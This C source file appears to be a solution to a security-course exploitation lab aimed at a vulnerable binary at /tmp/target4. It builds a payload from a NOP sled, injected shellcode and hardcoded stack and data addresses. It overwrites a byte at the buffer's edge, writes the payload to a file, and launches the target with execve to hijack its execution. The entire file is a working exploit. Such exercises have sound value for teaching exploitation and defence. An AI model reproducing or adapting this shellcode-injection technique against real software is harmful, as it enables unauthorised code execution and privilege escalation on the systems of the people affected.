#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target4"
#define DEFAULT_FILE "/tmp/xploit4_output"

#define ADDR_SAIDA 0x555555558010
#define ADDR_EXPLOIT_ARG 0x7ffffffeed40

int main(void)
{
  char exploit[129];

  memset(exploit, '\x90', sizeof(exploit));
  memcpy(exploit + 1, shellcode, sizeof(shellcode) - 1);

  *(size_t *)(exploit + 24) = ADDR_EXPLOIT_ARG;
  *(size_t *)(exploit + 32) = ADDR_SAIDA;
  *(size_t *)(exploit + 128) = 0x68;

  write_xploit(exploit, sizeof(exploit), DEFAULT_FILE);

  char *args[] = { TARGET, DEFAULT_FILE, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  perror("execve failed");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}

